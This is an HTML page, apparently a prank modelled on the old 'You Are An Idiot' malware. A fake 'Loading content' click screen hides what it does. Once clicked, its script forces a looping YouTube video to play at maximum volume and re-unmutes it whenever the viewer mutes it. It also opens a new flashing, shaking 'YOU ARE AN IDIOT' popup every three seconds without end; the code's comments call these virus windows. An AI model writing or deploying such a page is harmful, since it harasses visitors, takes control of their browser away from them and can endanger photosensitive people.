<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        html, body {
            margin: 0; padding: 0; height: 100%;
            background: #000; overflow: hidden;
            font-family: Arial, sans-serif;
        }
        #start-screen {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            background: #000; cursor: pointer; z-index: 9999;
        }
        #start-screen h1 {
            font-size: 22px; color: #fff; margin-bottom: 30px;
        }
        #green-btn {
            background: #00cc44; color: #fff; border: none;
            padding: 18px 40px; font-size: 20px;
            border-radius: 8px; cursor: pointer;
            box-shadow: 0 0 20px rgba(0, 204, 68, 0.6);
        }
        #green-btn:hover { background: #00ff55; }
        #video-container {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 1; display: none; background: #000;
            overflow: hidden;
        }
        #yt-player {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="start-screen" onclick="startVideo()">
        <h1>Загрузка контента...</h1>
        <button id="green-btn" onclick="event.stopPropagation(); startVideo();">
            ▶ Нажми, чтобы показать
        </button>
    </div>

    <div id="video-container">
        <div id="yt-player"></div>
    </div>

    <script>
        // ============================================================
        //  YouTube IFrame API
        // ============================================================
        var tag = document.createElement('script');
        tag.src = "https://www.youtube.com/iframe_api";
        document.head.appendChild(tag);

        var VIDEO_ID = 'b2pD0B9Rfps';
        var ytPlayer = null;
        var ytReady = false;

        var started = false;
        var chaosInterval = null;
        var spamCount = 0;

        // ============================================================
        //  РАЗРЕШЕНИЕ ЗВУКА — запрашиваем при загрузке страницы
        // ============================================================
        function requestSoundPermission() {
            try {
                // Создаём AudioContext и резюмируем его — это разрешает звук
                var AudioContext = window.AudioContext || window.webkitAudioContext;
                if (AudioContext) {
                    var ctx = new AudioContext();
                    if (ctx.state === 'suspended') {
                        ctx.resume();
                    }
                    // Создаём пустой источник, чтобы активировать аудио-контекст
                    var buffer = ctx.createBuffer(1, 1, 22050);
                    var source = ctx.createBufferSource();
                    source.buffer = buffer;
                    source.connect(ctx.destination);
                    source.start(0);
                }
            } catch(e) {}

            // Пробуем разблокировать звук у HTML5-видео
            try {
                var v = document.createElement('video');
                v.muted = false;
                v.volume = 1.0;
                v.play().catch(function(){});
            } catch(e) {}

            // Запрос разрешения на автовоспроизведение (Chrome)
            try {
                if (navigator.mediaSession) {
                    navigator.mediaSession.playbackState = 'playing';
                }
            } catch(e) {}
        }

        // Запускаем запрос сразу
        requestSoundPermission();

        // И повторяем при первом любом взаимодействии
        document.addEventListener('click', requestSoundPermission, { once: true });
        document.addEventListener('touchstart', requestSoundPermission, { once: true });
        document.addEventListener('keydown', requestSoundPermission, { once: true });

        // ============================================================
        //  YouTube плеер
        // ============================================================
        function onYouTubeIframeAPIReady() {
            ytPlayer = new YT.Player('yt-player', {
                height: '100%',
                width: '100%',
                videoId: VIDEO_ID,
                playerVars: {
                    autoplay: 1,           // автозапуск
                    controls: 0,
                    loop: 1,
                    playlist: VIDEO_ID,
                    modestbranding: 1,
                    rel: 0,
                    fs: 0,
                    iv_load_policy: 3,
                    mute: 0                 // НЕ приглушать
                },
                events: {
                    'onReady': function(event) {
                        ytReady = true;
                        fitYouTubeToScreen();
                        // Звук сразу на максимум
                        event.target.setVolume(100);
                        event.target.unMute();
                        if (started) {
                            event.target.playVideo();
                        }
                    },
                    'onStateChange': function(event) {
                        if (event.data === YT.PlayerState.ENDED) {
                            ytPlayer.seekTo(0);
                            ytPlayer.playVideo();
                        }
                        // Если плеер заглушили — включаем звук обратно
                        if (event.data === YT.PlayerState.PLAYING) {
                            try {
                                ytPlayer.unMute();
                                ytPlayer.setVolume(100);
                            } catch(e) {}
                        }
                    }
                }
            });
        }

        function fitYouTubeToScreen() {
            var container = document.getElementById('video-container');
            var w = container.clientWidth;
            var h = container.clientHeight;
            var videoAspect = 16 / 9;
            var screenAspect = w / h;
            var iframe = document.getElementById('yt-player');
            if (!iframe) return;

            if (screenAspect > videoAspect) {
                iframe.style.width = w + 'px';
                iframe.style.height = (w / videoAspect) + 'px';
            } else {
                iframe.style.height = h + 'px';
                iframe.style.width = (h * videoAspect) + 'px';
            }
        }
        window.addEventListener('resize', fitYouTubeToScreen);

        // ============================================================
        //  СТАРТ
        // ============================================================
        function startVideo() {
            if (started) return;
            started = true;

            // Разрешаем звук ещё раз
            requestSoundPermission();

            document.getElementById('start-screen').classList.add('hidden');
            document.getElementById('video-container').style.display = 'block';
            fitYouTubeToScreen();

            if (ytReady && ytPlayer) {
                ytPlayer.setVolume(100);
                ytPlayer.unMute();
                ytPlayer.playVideo();
            }

            // Каждые 3 секунды — новое окно, бесконечно
            openVirusWindow();
            chaosInterval = setInterval(function() {
                openVirusWindow();
            }, 3000);
        }

        // ============================================================
        //  ОКНО ВИРУСА
        // ============================================================
        function openVirusWindow() {
            spamCount++;
            try {
                var w = window.open('', '_blank', 'width=600,height=500');
                if (w) {
                    w.document.write(`
                        <html>
                        <head><title>YOU ARE AN IDIOT</title></head>
                        <body style="background:black;color:red;font-family:monospace;
                                     text-align:center;padding-top:50px;overflow:hidden;margin:0;">
                            <h1 style="font-size:60px;animation:blink 0.4s infinite;margin:0;">
                                YOU ARE AN IDIOT
                            </h1>
                            <h2 style="font-size:30px;margin-top:20px;">SURVIVAL FOR THE FITTEST</h2>
                            <p style="font-size:18px;">#${spamCount}</p>
                            <button onclick="window.close()" style="font-size:20px;
                                    padding:15px 30px;margin-top:30px;
                                    background:red;color:white;border:none;
                                    cursor:pointer;">CLOSE ME</button>
                            <style>
                                @keyframes blink {
                                    0% { color: red; background: black; }
                                    50% { color: black; background: red; }
                                    100% { color: red; background: black; }
                                }
                                body { animation: shake 0.1s infinite; }
                                @keyframes shake {
                                    0% { transform: translate(0,0); }
                                    25% { transform: translate(2px,2px); }
                                    50% { transform: translate(-2px,-2px); }
                                    75% { transform: translate(2px,-2px); }
                                    100% { transform: translate(0,0); }
                                }
                            </style>
                        </body>
                        </html>
                    `);
                }
            } catch(e) {}
        }
    </script>
</body>
</html>
